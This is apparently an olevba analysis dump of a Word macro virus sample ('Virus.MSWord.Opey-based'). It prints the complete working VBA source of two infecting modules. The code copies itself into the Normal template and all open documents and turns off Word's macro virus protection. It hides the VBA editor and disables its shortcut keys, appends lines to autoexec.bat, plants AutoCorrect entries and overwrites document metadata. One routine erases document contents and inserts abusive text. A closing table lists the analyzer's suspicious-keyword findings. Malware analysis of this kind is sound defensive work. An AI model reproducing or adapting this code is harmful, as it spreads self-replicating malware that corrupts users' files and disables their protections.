olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-47dc442713434daf0eff8475525b1c62c0c2d399
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-47dc442713434daf0eff8475525b1c62c0c2d399 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim x1, x2, x3, x4 As Boolean
Dim x5, x6 As Object
Dim x7, x8, x16 As Integer
Dim x9 As Date
Dim x10, x11, x12, x13, x14 As String
Const x15 = ":-D you are marked!"
Private Sub AutoOpen()
  If DateDiff("s", CDate(GetSetting("3BEPb", "Startup", "date", 0)), Time) > 300 Then
    'ActiveDocument.Shapes("3BEPb").Activate
    Selection.HomeKey Unit:=wdStory
    CommandBars("Tools").Controls("Macro").Visible = False
    Options.SaveNormalPrompt = False
  End If
End Sub
Private Sub Document_Close()
On Error Resume Next
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
    Application.Caption = "Happy Birthday Shankar-25th July.The World may Forget but not me"
    x10 = MsgBox("Did You Wish Shankar on his Birthday ?", vbYesNo)
    If x10 = vbYes Then
        MsgBox "Thank You! I Love You. You are wonderfull."
    Else
        MsgBox " You are Heart Less." & vbCrLf & "You Will Be Punished For This", vbCritical
    End If
End If
If x3 = True Then
    x13 = x5.CodeModule.Lines(1, x5.CodeModule.CountOfLines)
ElseIf x4 = True Then
    x13 = x6.CodeModule.Lines(1, x6.CodeModule.CountOfLines)
End If

If (x3 = True Xor x4 = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then

      If x3 = True Then
        x2 = NormalTemplate.Saved
        x11 = x5.CodeModule.Lines(1, x5.CodeModule.CountOfLines)
        x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
        x6.CodeModule.AddFromString x11
        With Dialogs(wdDialogFileSummaryInfo): .Title = "Are You suprised ?": .Subject = "Birthday ": .Author = "LSK": .Category = "You Are Infected": .Keywords = "Birthday": .Comments = "Shankar's Birthday falls on 25th July.  Don't Forget to wish him": .Execute: End With
        If x2 = True Then NormalTemplate.Save
      End If
    If x4 = True Or ActiveDocument.Saved = False Then
     x1 = ActiveDocument.Saved
     x11 = x6.CodeModule.Lines(1, x6.CodeModule.CountOfLines)
     x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
     x5.CodeModule.AddFromString x11
     With Dialogs(wdDialogFileSummaryInfo): .Title = "Are You suprised ?": .Subject = "Birthday ": .Author = "LSK": .Category = "You Are Infected": .Keywords = "Birthday": .Comments = "Shankar's Birthday falls on 25th July.  Don't Forget to wish him": .Execute: End With
     If x1 = True Then ActiveDocument.Save
   End If
  
    
End If

End Sub

Private Sub Document_New()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
End If
If x3 = False Then
        x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
End If

x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
With Selection.Font: x16 = .Size: .Size = 72: .ColorIndex = wdGreen: .Animation = wdAnimationSparkleText: Selection.InsertAfter "Happy BirthDay Shankar": Selection.MoveDown Unit:=wdScreen, Count:=2: .Size = x16: .ColorIndex = wdAuto: .Animation = wdAnimationNone: End With
End If
End Sub

Private Sub Document_Open()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
End If
If x3 = False Then
        x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
End If

x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
    x10 = MsgBox("Did You Wish Shankar on his Birthday ?", vbYesNo)
End If
End Sub









































-------------------------------------------------------------------------------
VBA MACRO Crazy_Man_02.bas 
in file: Virus.MSWord.Opey-based-47dc442713434daf0eff8475525b1c62c0c2d399 - OLE stream: 'Macros/VBA/Crazy_Man_02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub greetings()
    On Error Resume Next
         If (Month(Now()) > 7) Then
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) > 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) > 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: The Crazy Man"
                        Print #hFile, "pause"
                    Close hFile
                End If
        
         With AutoCorrect.Entries
         .Add Name:="Author", Value:="Author The Crazy Man"
         .Add Name:="President", Value:="President Mr. Josep Estrada"
         .Add Name:="M.Mla.", Value:="Metro Manila Philippines"
         .Add Name:="I am", Value:="I am The Crazy Man"
         .Add Name:="I'm", Value:="I'm The Crazy Man"
         .Add Name:="Who is", Value:="Who is the Crazy Man"
         End With
        End If
End Sub

Sub Crazy_man()
  On Error Resume Next
    Call Crazy_Man_02
    NTInfected = False
        For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(I).Name
                If clan = "Crazy_Man_02" Then NTInfected = True
                If (clan <> "Crazy_Man_02") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next I
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "Crazy_Man_02" Then ODInfected = True
                    If (clan <> "Crazy_Man_02") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Crazy_Man_02", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crazy_Man_02", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
    ActiveDocument.Activate
End Sub
Sub Crazy_Man_02()
    On Error Resume Next
     If (Month(Now()) > 7) Then
      Application.UserName = "Crazy Man"
      Application.UserAddress = "LBTMM B'99 PHILIPPINES"
      Application.UserInitials = "Crazy"
      With Dialogs(wdDialogFileSummaryInfo)
        .Author.Value = ""
        .Title.Value = ""
        .Manager.Value = ""
        .Company.Value = ""
        .Comments.Value = ""
        .Execute
    End With
        
    With Dialogs(wdDialogFileSummaryInfo)
        .Author.Value = "Crazy Man"
        .Title.Value = "Crazy"
        .Manager.Value = "MMA"
        .Company.Value = "Crazy Man Company"
        .Comments.Value = "HELLO I am the Crazy Man From the Crazy World of Computer. Don't you worry I'm not as crazy than you tink..."
        .Execute
    End With
    End If
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub filesave()
    On Error Resume Next
    Call Crazy_man
    ActiveDocument.Save
End Sub
Sub fileclose()
    On Error Resume Next
    Call Crazy_man
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Crazy_man
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call Crazy_man
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Crazy_man
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Crazy_man
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call Crazy_man
    With Dialogs(wdDialogFileSaveAs)
        .Show
        .FileName = "Crazy Man.*"
     End With
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call Crazy_man
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub fileprint()
    On Error Resume Next
    Call Crazy_man
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Crazy_man
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Selection.WholeStory
    On Error Resume Next
    Selection.Delete Unit:=wdCharacter, Count:=1
    On Error Resume Next
    Selection.Font.Name = "Times New Roman"
    On Error Resume Next
    Selection.Font.Size = 14
    On Error Resume Next
    Selection.TypeText Text:="Aha!!! You Wan't to know my code..."
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.TypeText Text:="Kill me first"
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.Font.Size = 26
    On Error Resume Next
    Selection.Font.Bold = wdToggle
    On Error Resume Next
    If Selection.Font.Underline = wdUnderlineNone Then
        Selection.Font.Underline = wdUnderlineSingle
    Else
        Selection.Font.Underline = wdUnderlineNone
    End If
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.TypeText Text:="FUCK YOU !!!!"
    
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    On Error Resume Next
    Application.Quit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

